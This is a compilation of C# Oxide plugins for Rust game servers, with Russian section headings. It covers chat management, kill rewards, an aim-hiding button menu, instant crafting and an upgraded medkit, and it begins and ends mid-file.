                Result = $"{Format(time.Days, Days, Days, Days)}";

            return Result;
        }
        
        
        [ConsoleCommand("alert")]
        private void AlertConsoleCommand(ConsoleSystem.Arg args)
        {
            BasePlayer Sender = args.Player();
            if (Sender != null)
                if (!permission.UserHasPermission(Sender.UserIDString, PermissionAlert)) return;

            Alert(Sender, args.Args, false);
        }

        void OnPlayerDisconnected(BasePlayer player, string reason) => AlertDisconnected(player, reason);
        void API_ALERT(String Message, Chat.ChatChannel channel = Chat.ChatChannel.Global, String CustomPrefix = null, String CustomAvatar = null, String CustomHex = null)
        {
            foreach (BasePlayer p in BasePlayer.activePlayerList)
                ReplySystem(p, Message, CustomPrefix, CustomAvatar, CustomHex);
        }
        private const String PermissionAlert = "iqchat.alertuse";

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                try
                {
                    configOld = Config.ReadObject<ConfigurationOld>();
                    if (configOld != null)
                    {
                        string file =
                            $"{Interface.Oxide.ConfigDirectory}{Path.DirectorySeparatorChar}{Name}.backup_old_system.{DateTime.Now:yyyy-MM-dd hh-mm-ss}.json";
                        Config.WriteObject(configOld, false, file);
                        PrintWarning($"A BACKUP OF THE OLD CONFIGURATION WAS CREATED - {file}");
                    }
                }
                catch{}

                config = Config.ReadObject<Configuration>();
                if (config == null) LoadDefaultConfig();

                if (config.ControllerMessages.Formatting.ControllerNickname.AllowedLinkNick == null ||
                    config.ControllerMessages.Formatting.ControllerNickname.AllowedLinkNick.Count == 0)
                    config.ControllerMessages.Formatting.ControllerNickname.AllowedLinkNick = new List<String>()
                    {
                        "mysite.com"
                    };
            }
            catch
            {
                PrintWarning(LanguageEn
                    ? $"Error #132 read configuration 'oxide/config/{Name}', create a new configuration!!"
                    : $"Ошибка #132 чтения конфигурации 'oxide/config/{Name}', создаём новую конфигурацию!!");
                
                LoadDefaultConfig();
            }

            NextTick(SaveConfig);
        }
        private void DrawUI_IQChat_OpenDropList(BasePlayer player, TakeElementUser ElementType, Int32 Page = 0)
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_OpenDropList");
            if (Interface == null) return;

            if (!LocalBase.ContainsKey(player)) return;

            String Title = String.Empty;
            String Description = String.Empty;
            List<Configuration.ControllerParameters.AdvancedFuncion> InfoUI = new List<Configuration.ControllerParameters.AdvancedFuncion>();

            switch (ElementType)
            {
                case TakeElementUser.MultiPrefix:
                case TakeElementUser.Prefix:
                    {
                        InfoUI = LocalBase[player].ElementsPrefix;
                        Title = GetLang("IQCHAT_CONTEXT_SLIDER_PREFIX_TITLE", player.UserIDString);
                        Description = GetLang("IQCHAT_CONTEXT_DESCRIPTION_PREFIX", player.UserIDString);
                        break;
                    }
                case TakeElementUser.Nick:
                    {
                        InfoUI = LocalBase[player].ElementsNick;
                        Title = GetLang("IQCHAT_CONTEXT_SLIDER_NICK_COLOR_TITLE", player.UserIDString);
                        Description = GetLang("IQCHAT_CONTEXT_DESCRIPTION_NICK", player.UserIDString);
                        break;
                    }
                case TakeElementUser.Chat:
                    {
                        InfoUI = LocalBase[player].ElementsChat;
                        Title = GetLang("IQCHAT_CONTEXT_SLIDER_MESSAGE_COLOR_TITLE", player.UserIDString);
                        Description = GetLang("IQCHAT_CONTEXT_DESCRIPTION_CHAT", player.UserIDString);
                        break;
                    }      
                case TakeElementUser.Rank:
                    {
                        InfoUI = LocalBase[player].ElementsRanks;
                        Title = GetLang("IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE", player.UserIDString);
                        Description = GetLang("IQCHAT_CONTEXT_DESCRIPTION_RANK", player.UserIDString);
                        break;
                    }
                default:
                    break;
            }

          //  if (InfoUI == null || InfoUI.Count == 0) return;

            Interface = Interface.Replace("%TITLE%", Title);
            Interface = Interface.Replace("%DESCRIPTION%", Description);

            String CommandRight = InfoUI.Skip(9 * (Page + 1)).Count() > 0 ? $"newui.cmd droplist.controller page.controller {ElementType} + {Page}" : String.Empty;
            String CommandLeft = Page != 0 ? $"newui.cmd droplist.controller page.controller {ElementType} - {Page}" : String.Empty;

            Interface = Interface.Replace("%NEXT_BTN%", CommandRight); 
            Interface = Interface.Replace("%BACK_BTN%", CommandLeft);

            Interface = Interface.Replace("%COLOR_RIGHT%", String.IsNullOrWhiteSpace(CommandRight) ? "1 1 1 0.1" : "1 1 1 1");
            Interface = Interface.Replace("%COLOR_LEFT%", String.IsNullOrWhiteSpace(CommandLeft) ? "1 1 1 0.1" : "1 1 1 1");
            
            CuiHelper.DestroyUi(player, "OpenDropList");
            CuiHelper.AddUi(player, Interface);

            Int32 Count = 0;
            Int32 X = 0, Y = 0;
            foreach (Configuration.ControllerParameters.AdvancedFuncion Info in InfoUI.Skip(9 * Page).Take(9))
            {
                DrawUI_IQChat_OpenDropListArgument(player, ElementType, Info, X, Y, Count);

                if(ElementType == TakeElementUser.MultiPrefix && UserInformation[player.userID].Info.PrefixList.Contains(Info.Argument))
                    DrawUI_IQChat_OpenDropListArgument(player, Count);

                Count++;
                X++;
                if (X == 3)
                {
                    X = 0;
                    Y++;
                }
            }
        }
        internal class FlooderInfo
        {
            public Double Time;
            public String LastMessage;
            public Int32 TryFlood;
        }
        public Dictionary<UInt64, User> UserInformation = new Dictionary<UInt64, User>();
		   		 		  						  	   		  	  			  	  			  	   		  		  
        
                [ChatCommand("online")]
        private void ShowPlayerOnline(BasePlayer player)
        {
            List<String> PlayerNames = GetPlayersOnline();
            String Message = GetLang("IQCHAT_INFO_ONLINE", player.UserIDString, String.Join($"\n", PlayerNames));
            ReplySystem(player, Message);
        }

        void ReadData()
        {
            if (!Oxide.Core.Interface.Oxide.DataFileSystem.ExistsDatafile("IQSystem/IQChat/Users") && Oxide.Core.Interface.Oxide.DataFileSystem.ExistsDatafile("IQChat/Users"))
            {
                GeneralInfo = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<GeneralInformation>("IQChat/Information");
                UserInformation = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<Dictionary<UInt64, User>>("IQChat/Users");

                Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQSystem/IQChat/Information", GeneralInfo);
                Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQSystem/IQChat/Users", UserInformation);

                PrintWarning(LanguageEn ? "Your player data has been moved to a new directory - IQSystem/IQChat , you can delete old data files!" : "Ваши данные игроков были перенесены в новую директорию - IQSystem/IQChat , вы можете удалить старые дата-файлы!");
            }

            GeneralInfo = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<GeneralInformation>("IQSystem/IQChat/Information");
            UserInformation = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<Dictionary<UInt64, User>>("IQSystem/IQChat/Users");
            UserInformationConnection = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<Dictionary<UInt64, AntiNoob>>("IQSystem/IQChat/AntiNoob");
        }
		   		 		  						  	   		  	  			  	  			  	   		  		  
        
                private void DrawUI_IQChat_Sliders(BasePlayer player, String Name, String OffsetMin, String OffsetMax, TakeElementUser ElementType)
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Slider");
            if (Interface == null) return;

            Interface = Interface.Replace("%OFFSET_MIN%", OffsetMin); 
            Interface = Interface.Replace("%OFFSET_MAX%", OffsetMax);
            Interface = Interface.Replace("%NAME%", Name);
            Interface = Interface.Replace("%COMMAND_LEFT_SLIDE%", $"newui.cmd slider.controller {ElementType} -");
            Interface = Interface.Replace("%COMMAND_RIGHT_SLIDE%", $"newui.cmd slider.controller {ElementType} +");

            CuiHelper.DestroyUi(player, Name);
            CuiHelper.AddUi(player, Interface);

            DrawUI_IQChat_Slider_Update_Argument(player, ElementType);
        }

        private void RegisteredPermissions()
        {
            Configuration.ControllerParameters Controller = config.ControllerParameter;
            IEnumerable<Configuration.ControllerParameters.AdvancedFuncion> Parametres = Controller.Prefixes.Prefixes
                .Concat(Controller.NickColorList).Concat(Controller.MessageColorList);

            foreach (Configuration.ControllerParameters.AdvancedFuncion Permission in Parametres.Where(perm =>
                         !permission.PermissionExists(perm.Permissions, this)))
                permission.RegisterPermission(Permission.Permissions, this);

            if (!permission.PermissionExists(PermissionHideOnline, this))
                permission.RegisterPermission(PermissionHideOnline, this);
            if (!permission.PermissionExists(PermissionRename, this))
                permission.RegisterPermission(PermissionRename, this);
            if (!permission.PermissionExists(PermissionMute, this))
                permission.RegisterPermission(PermissionMute, this);
            if (!permission.PermissionExists(PermissionAlert, this))
                permission.RegisterPermission(PermissionAlert, this);
            if (!permission.PermissionExists(PermissionAntiSpam, this))
                permission.RegisterPermission(PermissionAntiSpam, this);
            if (!permission.PermissionExists(PermissionHideConnection, this))
                permission.RegisterPermission(PermissionHideConnection, this);
            if (!permission.PermissionExists(PermissionHideDisconnection, this))
                permission.RegisterPermission(PermissionHideDisconnection, this);
            if (!permission.PermissionExists(PermissionMutedAdmin, this))
                permission.RegisterPermission(PermissionMutedAdmin, this);

            PrintWarning("Permissions - completed");
        }

        [ChatCommand("unmute")]
        void UnMuteCustomChat(BasePlayer Moderator, string cmd, string[] arg)
        {
            if (!permission.UserHasPermission(Moderator.UserIDString, PermissionMute)) return;
            if (arg == null || arg.Length != 1 || arg.Length > 1)
            {
                ReplySystem(Moderator, LanguageEn ? "Invalid syntax, please use : unmute Steam64ID" : "Неверный синтаксис,используйте : unmute Steam64ID");
                return;
            }
            string NameOrID = arg[0];
            BasePlayer target = GetPlayerNickOrID(NameOrID);
            if (target == null)
            {
                UInt64 Steam64ID = 0;
                if (UInt64.TryParse(NameOrID, out Steam64ID))
                {
                    if(UserInformation.ContainsKey(Steam64ID))
                    {
                        User Info = UserInformation[Steam64ID];
                        if (Info == null) return;
                        if (!Info.MuteInfo.IsMute(MuteType.Chat))
                        {
                            ReplySystem(Moderator, LanguageEn ? "The player does not have a chat lock" : "У игрока нет блокировки чата");
                            return;
                        }
                        
                        Info.MuteInfo.UnMute(MuteType.Chat);
                        ReplySystem(Moderator, LanguageEn ? "You have unblocked the offline chat to the player" : "Вы разблокировали чат offline игроку");
                        return;
                    }
                    else
                    {
                        ReplySystem(Moderator,LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                        return;
                    }
                }
                else
                {
                    ReplySystem(Moderator,LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                    return;
                }
            }
            UnmutePlayer(target, MuteType.Chat, Moderator, false, true);
        }

        
                public void BroadcastAuto()
        {
            Configuration.ControllerAlert.Alert Broadcast = config.ControllerAlertSetting.AlertSetting;

            if (Broadcast.AlertMessage)
            {
                Int32 IndexBroadkastNow = 0;
                String RandomMsg = String.Empty;
                    
                timer.Every(Broadcast.MessageListTimer, () =>
                 {
                     if (Broadcast.AlertMessageType)
                     {
                         foreach (BasePlayer p in BasePlayer.activePlayerList)
                         {
                             List<String> MessageList = GetMesagesList(p, Broadcast.MessageList.LanguageMessages);
                             
                             if (IndexBroadkastNow >= MessageList.Count)
                                 IndexBroadkastNow = 0;
                             RandomMsg = MessageList[IndexBroadkastNow];
                             
                             ReplySystem(p, RandomMsg);
                         }

                         IndexBroadkastNow++;
                     }
                     else
                     {
                         foreach (BasePlayer p in BasePlayer.activePlayerList)
                             ReplySystem(p, GetMessages(p, Broadcast.MessageList.LanguageMessages));
                     }
                 });
                
            }
        }
        String IQRankGetNameRankKey(string Key) => (string)(IQRankSystem?.Call("API_GET_RANK_NAME", Key));
        static Double CurrentTime => Facepunch.Math.Epoch.Current;

            }
}

###ПЛАГИ НА ВЫДАЧУ ХП/ПАТРОН ПОСЛЕ УБИЙСТВА ИГРОКА###

/*
 * Exotic Plugins © 2021
 * Stealing my plugins is prohibited (even if you edited them)
 * Sharing my plugins with others is prohibited
 * For support join our discord - https://discord.gg/YnbYaugRMh
 */

using System.Collections.Generic;
using Newtonsoft.Json;

namespace Oxide.Plugins
{
    [Info("Kill Options", "Tryhard", "1.0.0")]
    [Description("Refills players magazine, heals the player and stops bleeding after getting a kill")]
    public class KillOptions : RustPlugin
    {
        #region Config

        private ConfigFile _config;

        private class ConfigFile
        {
            [JsonProperty("Fill player magazine after getting a kill")]
            public bool eAmmo = true;
            [JsonProperty("Heal player after getting a kill")]
            public bool eHealth = true;
            [JsonProperty("Stop bleeding after getting a kill")]
            public bool eBleed = true;
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();

            try
            {
                _config = Config.ReadObject<ConfigFile>();

                if (_config == null) LoadDefaultConfig();
            }

            catch
            {
                PrintError("Configuration file is corrupt, check your config file at https://jsonlint.com/!");
                LoadDefaultConfig();
                return;
            }

            SaveConfig();
        }

        protected override void LoadDefaultConfig() => _config = new ConfigFile();

        protected override void SaveConfig() => Config.WriteObject(_config);

        #endregion

        #region Hooks

        private void Init() => permission.RegisterPermission("KillOptions.on", this);

        private void OnPlayerDeath(BasePlayer victim, HitInfo hitInfo)
        {
            if (hitInfo == null || victim == null || victim.IsNpc) return;

            var attacker = hitInfo.InitiatorPlayer;

            if (attacker == victim || attacker == null) return;
         
            var projectile = attacker.GetHeldEntity() as BaseProjectile;
                
            if (attacker is BasePlayer && victim is BasePlayer)
            {
                if (permission.UserHasPermission(attacker.UserIDString, "KillOptions.on"))
                {
                    if (_config.eAmmo)
                    {
                        if (projectile == null)
                        {
                            return;
                        }

                        projectile.TopUpAmmo();
                        projectile.SendNetworkUpdateImmediate();
                    }

                    if (_config.eHealth)
                    {
                        attacker.Heal(100f);
                    }

                    if (_config.eHealth)
                    {
                        attacker.metabolism.bleeding.value = 0;
                    }
                }
            }
        }
        #endregion
    }
}


###ПЛАГИ НА КНОПКИ КОТОРЫЕ СКРЫВАЮТСЯ У ИГРОКА ПРИ ПРИЦЕЛИВАНИИ В CUI(ПРИМЕР КНОПКИ - ПРИЦЕЛЫ)###


using System;
using System.Collections.Generic;
using Facepunch;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Libraries.Covalence;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("MENUSHKA", "ANUS", "1.0.0")]
    public class MENUSHKA : RustPlugin
    {
        [PluginReference] Plugin ImageLibrary;

        private const string Layer = "UI_DrawInterface";
        private HashSet<BasePlayer> aimingPlayers = new HashSet<BasePlayer>();

        private void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, Layer);
            }
        }

        void OnServerInitialized()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                OnPlayerConnected(player);
            }
        }

        private void OnPlayerConnected(BasePlayer player)
        {
            if (player.IsReceivingSnapshot)
            {
                NextTick(() => OnPlayerConnected(player));
                return;
            }

            UI_DrawInterface(player);
        }

        private void UI_DrawInterface(BasePlayer player)
        {
            if (aimingPlayers.Contains(player))
                return;

            var elements = new CuiElementContainer();
            var container = new CuiElementContainer();

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                RectTransform = { AnchorMin = "0.5 0", AnchorMax = "0.5 0", OffsetMin = "0 48", OffsetMax = "0 48" },
                Image = { Color = "0 0 0 0", Sprite = "Assets/Content/UI/UI.Background.Tile.psd", Material = "assets/content/ui/uibackgroundblur.mat" }
            }, "Overlay", Layer);

            elements.Add(new CuiButton
            {
                Button = { Command = $"chat.say /mymini", Color = "205 214 219 0" },
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "-275 -1", OffsetMax = "-195 30" },
                Text = { Text = "+КОПТЕР", Align = TextAnchor.MiddleCenter, FontSize = 12 }
            }, Layer);

            elements.Add(new CuiButton
            {
                Button = { Command = $"chat.say /nomini", Color = "205 214 219 0" },
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "-275 -30", OffsetMax = "-195 -1" },
                Text = { Text = "-КОПТЕР", Align = TextAnchor.MiddleCenter, FontSize = 12 }
            }, Layer);

            elements.Add(new CuiButton
            {
                Button = { Command = "chat.say /hit", Color = "0 0 0 0" },
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "182 -30", OffsetMax = "250 -8" },
                Text = { Text = "ХИТМАРКЕР", Align = TextAnchor.MiddleCenter, FontSize = 12 }
            }, Layer);




            elements.Add(new CuiButton
            {
                Button = { Command = $"chat.say /top", Color = "205 214 219 0" },
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "182 -8", OffsetMax = "250 10" },
                Text = { Text = "ТОП", Align = TextAnchor.MiddleCenter, FontSize = 12 }
            }, Layer);

            elements.Add(new CuiButton
            {
                Button = { Command = $"chat.say /hair", Color = "205 214 219 0" },
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "182 10", OffsetMax = "250 30" },
                Text = { Text = "ПРИЦЕЛЫ", Align = TextAnchor.MiddleCenter, FontSize = 12 }
            }, Layer);

            CuiHelper.DestroyUi(player, Layer);
            CuiHelper.AddUi(player, container);
            CuiHelper.AddUi(player, elements);
        }

        private void HideInterface(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, Layer);
        }

        private void OnPlayerInput(BasePlayer player, InputState input)
        {
            if (input == null)
                return;

            if (input.IsDown(BUTTON.FIRE_SECONDARY))
            {
                if (!aimingPlayers.Contains(player))
                {
                    aimingPlayers.Add(player);
                    HideInterface(player);
                }
            }
            else
            {
                if (aimingPlayers.Contains(player))
                {
                    aimingPlayers.Remove(player);
                    UI_DrawInterface(player);
                }
            }
        }
    }
}


###ПЛАГИН НА МГНОВЕНЫЙ КРАФТ###

using Newtonsoft.Json;
using System.Collections.Generic;
using Oxide.Core.Plugins;
using Oxide.Core;
using UnityEngine;
using System.Linq;
using System;

namespace Oxide.Plugins
{
    [Info("Instant Craft", "Vlad-0003 / Orange / rostov114", "2.2.7")]
    [Description("Allows players to instantly craft items with features")]
    public class InstantCraft : RustPlugin
    {
        #region Vars
        private const string permUse = "instantcraft.use";
        private const string permNormal = "instantcraft.normal";
        private readonly object True = true;
        private readonly object False = false;
        #endregion

        #region Oxide Hooks
        private void Init()
        {
            permission.RegisterPermission(permUse, this);
            permission.RegisterPermission(permNormal, this);

            _config.Init(this);

            if (!_config.HasAnyBlockedItems)
            {
                Unsubscribe(nameof(CanCraft));
            }
        }

        private object CanCraft(ItemCrafter itemCrafter, ItemBlueprint blueprint, int amount, bool free)
        {
            if (_config.IsBlocked(blueprint.targetItem))
            {
                Message(itemCrafter.baseEntity, "Blocked");
                return False;
            }

            return null;
        }

        private object OnItemCraft(ItemCraftTask task, BasePlayer owner)
        {
            if (task.cancelled)
            {
                return null;
            }

            if (permission.UserHasPermission(owner.UserIDString, permNormal) || !permission.UserHasPermission(owner.UserIDString, permUse))
            {
                return null;
            }

            List<int> stacks = GetStacks(task.blueprint.targetItem, task.amount * task.blueprint.amountToCreate);
            int slots = FreeSlots(owner);
            if (!HasPlace(slots, stacks))
            {
                CancelTask(task, owner, "Slots", stacks.Count, slots);
                return False;
            }

            if (_config.IsNormal(task.blueprint.targetItem))
            {
                Message(owner, "Normal");
                return null;
            }

            if (!GiveItem(task, owner, stacks))
            {
                return null;
            }

            return True;
        }
        #endregion

        #region API

        [HookMethod(nameof(API_IsItemBlocked))]
        public bool API_IsItemBlocked(ItemDefinition itemDefinition)
        {
            return _config.IsBlocked(itemDefinition);
        }

        [HookMethod(nameof(API_GetIsItemBlockedCallback))]
        public Func<ItemDefinition, bool> API_GetIsItemBlockedCallback()
        {
            return itemDefinition => _config.IsBlocked(itemDefinition);
        }

        #endregion

        #region Helpers
        public void CancelTask(ItemCraftTask task, BasePlayer owner, string reason, params object[] args)
        {
            task.cancelled = true;
            Message(owner, reason, args);
            GiveRefund(task, owner);
            Interface.CallHook("OnItemCraftCancelled", task, owner.inventory.crafting);
        }

        public void GiveRefund(ItemCraftTask task, BasePlayer owner)
        {
            if (task.takenItems != null && task.takenItems.Count > 0)
            {
                foreach (var item in task.takenItems)
                {
                    owner.inventory.GiveItem(item, null);
                }
            }
        }

        public bool GiveItem(ItemCraftTask task, BasePlayer owner, List<int> stacks)
        {
            ulong skin = ItemDefinition.FindSkin(task.blueprint.targetItem.itemid, task.skinID);
            int iteration = 0;

            if (_config.split)
            {
                foreach (var stack in stacks)
                {
                    if (!Give(task, owner, stack, skin) && iteration <= 0)
                    {
                        return false;
                    }

                    iteration++;
                }
            }
            else
            {
                int final = 0;
                foreach (var stack in stacks)
                {
                    final += stack;
                }

                if (!Give(task, owner, final, skin))
                {
                    return false;
                }
            }

            task.cancelled = true;
            return true;
        }

        public bool Give(ItemCraftTask task, BasePlayer owner, int amount, ulong skin)
        {
            Item item = null;
            try
            {
                item = ItemManager.CreateByItemID(task.blueprint.targetItem.itemid, amount, skin);
            }
            catch (Exception e)
            {
                PrintError($"Exception creating item! targetItem: {task.blueprint.targetItem}-{amount}-{skin}; Exception: {e}");
            }

            if (item == null)
            {
                return false;
            }

            if (item.hasCondition && task.conditionScale != 1f)
            {
                item.maxCondition *= task.conditionScale;
                item.condition = item.maxCondition;
            }

            item.OnVirginSpawn();

            if (task.instanceData != null)
            {
                item.instanceData = task.instanceData;
            }

            Interface.CallHook("OnItemCraftFinished", task, item, owner.inventory.crafting);

            if (owner.inventory.GiveItem(item))
            {
                owner.Command("note.inv", new object[]{item.info.itemid, amount});
                return true;
            }

            ItemContainer itemContainer = owner.inventory.crafting.containers.First<ItemContainer>();
            owner.Command("note.inv", new object[]{item.info.itemid, item.amount});
            owner.Command("note.inv", new object[]{item.info.itemid, -item.amount});
            item.Drop(itemContainer.dropPosition, itemContainer.dropVelocity, default(Quaternion));

            return true;
        }

        public int FreeSlots(BasePlayer player)
        {
            var slots = player.inventory.containerMain.capacity + player.inventory.containerBelt.capacity;
            var taken = player.inventory.containerMain.itemList.Count + player.inventory.containerBelt.itemList.Count;
            return slots - taken;
        }

        public List<int> GetStacks(ItemDefinition item, int amount)
        {
            var list = new List<int>();
            var maxStack = item.stackable;

            if (maxStack == 0)
            {
                maxStack = 1;
            }

            while (amount > maxStack)
            {
                amount -= maxStack;
                list.Add(maxStack);
            }

            list.Add(amount);

            return list; 
        }

        public bool HasPlace(int slots, List<int> stacks)
        {
            if (!_config.checkPlace)
            {
                return true;
            }

            if (_config.split && slots - stacks.Count < 0)
            {
                return false;
            }

            return slots > 0;
        }
        #endregion

        #region Localization 1.1.1
        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                {"Blocked", "Crafting of that item is blocked!"},
                {"Slots", "You don't have enough place to craft! Need {0}, have {1}!"},
                {"Normal", "Item will be crafted with normal speed."}
            }, this, "en");
        }

        public void Message(BasePlayer player, string messageKey, params object[] args)
        {
            if (player == null)
            {
                return;
            }

            var message = GetMessage(messageKey, player.UserIDString, args);
            player.ChatMessage(message);
        }

        public string GetMessage(string messageKey, string playerID, params object[] args)
        {
            return string.Format(lang.GetMessage(messageKey, this, playerID), args);
        }
        #endregion

        #region Configuration 1.1.0
        private Configuration _config;
        private class Configuration
        {
            [JsonProperty(PropertyName = "Check for free place")]
            public bool checkPlace = true;

            [JsonProperty(PropertyName = "Split crafted stacks")]
            public bool split = true;

            [JsonProperty(PropertyName = "Normal Speed")]
            private string[] normal =
            {
                "hammer",
                "put item shortname here"
            };

            [JsonProperty(PropertyName = "Blacklist")]
            private string[] blocked =
            {
                "rock",
                "put item shortname here"
            };

            private HashSet<int> _normalCraftItemIds = new HashSet<int>();
            private HashSet<int> _blockedItemIds = new HashSet<int>();

            [JsonIgnore]
            public bool HasAnyBlockedItems => _blockedItemIds.Count > 0;

            public void Init(InstantCraft plugin)
            {
                ValidateItemShortNames(plugin, normal, _normalCraftItemIds);
                ValidateItemShortNames(plugin, blocked, _blockedItemIds);
            }

            public bool IsNormal(ItemDefinition itemDefinition) => _normalCraftItemIds.Contains(itemDefinition.itemid);
            public bool IsBlocked(ItemDefinition itemDefinition) => _blockedItemIds.Contains(itemDefinition.itemid);

            private void ValidateItemShortNames(InstantCraft plugin, string[] itemShortNameList, HashSet<int> validItemIdList)
            {
                foreach (var itemShortName in itemShortNameList)
                {
                    if (itemShortName == "put item shortname here")
                        return;

                    var itemDefinition = ItemManager.FindItemDefinition(itemShortName);
                    if (itemDefinition == null)
                    {
                        plugin.PrintError($"Invalid item short name in config: {itemShortName}");
                        continue;
                    }

                    validItemIdList.Add(itemDefinition.itemid);
                }
            }
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();

            try
            {
                _config = Config.ReadObject<Configuration>();
                SaveConfig();
            }
            catch
            {
                PrintError("Error reading config, please check!");

                Unsubscribe(nameof(OnItemCraft));
            }
        }

        protected override void LoadDefaultConfig()
        {
            _config = new Configuration();
            SaveConfig();
        }

        protected override void SaveConfig() => Config.WriteObject(_config);
        #endregion
    }
}


###ПЛАГИН НА БОЛЬШУЮ АПТЕКУ НО УЛУЧШЕНУЮ КОТОРАЯ НАСТРАИВАЕТ И ХИЛИТ ИГРОКУ ОПРЕДЕЛЕНОЕ ХП( ПРИМЕР ЕСЛИ ОБЫЧНАЯ ХИЛИТ - 10 мгновено То плагин можем около 40-50)###

using System;
using System.Linq;
using UnityEngine;
using System.Collections.Generic;
using Oxide.Core;
using Oxide.Core.Plugins;
using Newtonsoft.Json;

///Скачано с дискорд сервера Rust Edit [PRO+]
///discord.gg/9vyTXsJyKR

namespace Oxide.Plugins
{
    [Info("SuperMedkit", "discord.gg/9vyTXsJyKR", "1.0.2")]
    class SuperMedkit : RustPlugin
    {                		
	
        #region Variables
		
		private const string BloodItemName = "blood";
		private const string MedkitItemName = "largemedkit";
		private static HashSet<ResourceDispenser> GivenAnimals = new HashSet<ResourceDispenser>();
		private static Dictionary<ulong, double> Cooldown = new Dictionary<ulong, double>();
		
		#endregion
		
		#region Hooks
		
		private void Init() => LoadVariables();
		
		private void OnDispenserGather(ResourceDispenser dispenser, BaseEntity entity, Item item)
        {			
            if (dispenser == null || entity == null || item == null) return;

			if (configData.BloodRates.ContainsKey(item.info.shortname) && !GivenAnimals.Contains(dispenser))			
			{
				BasePlayer player = entity.ToPlayer();
				if (player == null) return;				
				GiveBlood(player, configData.BloodRates[item.info.shortname]);
				GivenAnimals.Add(dispenser);
			}
		}
		
		private object OnItemSplit(Item item, int split_Amount)
        {
            if (item.info.shortname == BloodItemName)
            {
				var byItemId = ItemManager.CreateByName(BloodItemName, 1);				
                byItemId.amount = split_Amount;
                byItemId.name = item.name;
				item.amount -= split_Amount;
                item.MarkDirty();
                return byItemId;
            }
			
			if (item.info.shortname == MedkitItemName && item.skin == configData.SuperMedkitSkin)
            {
				var byItemId = ItemManager.CreateByName(MedkitItemName, 1, configData.SuperMedkitSkin);				
                byItemId.amount = split_Amount;
                byItemId.name = item.name;
				item.amount -= split_Amount;
                item.MarkDirty();
                return byItemId;
            }
			
            return null;
        }
		
		private object CanStackItem(Item item, Item anotherItem)
        {
            if (item.info.shortname == MedkitItemName && item.skin != anotherItem.skin) return false;
            return null;
        }        

        private object CanCombineDroppedItem(DroppedItem drItem, DroppedItem anotherDrItem)
        {
            if (drItem.item.info.shortname == MedkitItemName && drItem.item.info.itemid == anotherDrItem.item.info.itemid && drItem.item.skin != anotherDrItem.item.skin) return false;
            return null;
        }
		
		private bool? CanMoveItem(Item item, PlayerInventory playerLoot, uint targetContainer, int targetSlot, int amount)
        {
            if (item == null || playerLoot == null) return null;
            var player = playerLoot.containerMain.playerOwner;
            if (player == null) return null;
			
            if (item.info.shortname == BloodItemName)
            {
                var container = playerLoot.FindContainer(targetContainer);
                if (container != null)
                {
                    var getItem = container.GetSlot(targetSlot);
                    if (getItem != null && getItem.info.shortname == MedkitItemName)
                    {
						if (getItem.amount > getItem.info.stackable)
						{
							SendReply(player, "Расстакайте аптечки, прежде чем их улучшать!");
							return null;
						}
						
						if (ChangeItem(getItem))						
						{
							Effect.server.Run("assets/prefabs/misc/xmas/presents/effects/wrap.prefab", player, 0, Vector3.zero, Vector3.forward);
							item.UseItem();
							player.SendNetworkUpdate(BasePlayer.NetworkQueue.Update);
							return false;
						}
                    }
                }
            }
			
			return null;
        }
		
		private object OnItemAction(Item item, string action, BasePlayer player)
        {
            if (item == null || player == null) return null;
            if (action == "consume" && item.info.shortname == MedkitItemName && item.skin == configData.SuperMedkitSkin)
            {
                if (!Cooldown.ContainsKey(player.userID))
                    Cooldown.Add(player.userID, GrabCurrentTime() + 1);
                else 
					if (Cooldown[player.userID] > GrabCurrentTime()) 
						return false;
                
				var consumable = item.info.GetComponent<ItemModConsumable>();
								
				item.UseItem();
				if (consumable != null)
				{					
					foreach (ItemModConsumable.ConsumableEffect effect in consumable.effects)
					{
						if (effect.type != MetabolismAttribute.Type.Health)						
						{							
							player.metabolism.ApplyChange(effect.type, effect.amount, effect.time);
							
							if (effect.type.ToString() == "HealthOverTime")
							{
								player.metabolism.ApplyChange(effect.type, effect.amount, effect.time);
								player.metabolism.ApplyChange(effect.type, effect.amount, effect.time);
							}							
						}
						else													
							player.health += effect.amount;
					}
				}
								
                player.health += 35;
                player.SendNetworkUpdate();
                //Effect.server.Run("assets/bundled/prefabs/fx/gestures/take_pills.prefab", player, 0, Vector3.zero, Vector3.forward);
                Cooldown[player.userID] = GrabCurrentTime() + 10;
                
				return false;
            }
			
            return null;
        }
		
		#endregion
		
		#region Main
		
		private bool ChangeItem(Item item)
		{
			if (item == null)  return false;
			
			item.skin = configData.SuperMedkitSkin;
			item.name = configData.SuperMedkitName;
			item.MarkDirty();
			
			return true;
		}
		
		private void GiveBlood(BasePlayer player, int amount)
		{
			var item = ItemManager.CreateByName(BloodItemName, amount);
            item.name = configData.BloodName;
            player.GiveItem(item);
		}
		
		private double GrabCurrentTime() => DateTime.UtcNow.ToLocalTime().Subtract(new DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds;
		
